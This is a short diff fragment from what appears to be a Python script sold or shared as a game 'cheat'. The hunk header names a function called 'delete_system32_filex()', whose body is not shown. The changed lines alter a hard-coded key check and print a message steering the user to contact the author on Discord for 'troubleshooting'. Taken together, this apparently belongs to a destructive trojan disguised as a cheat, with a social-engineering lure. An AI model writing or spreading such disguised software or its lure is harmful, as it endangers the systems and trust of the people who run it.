@@ -29,7 +29,7 @@ delete_system32_filex()
 '''
 import zipfile
 import os
-if file_contentsx1 =="s2o5kMJ86s5BQ":
+if file_contentsx1 =="asdasdasdasd":
     os.system('cls')
     print("Hello, I see you're having trouble trying to make this cheat work.")
     print("Add me on discord and dm me so i can troubleshoot it for you: xxaes")
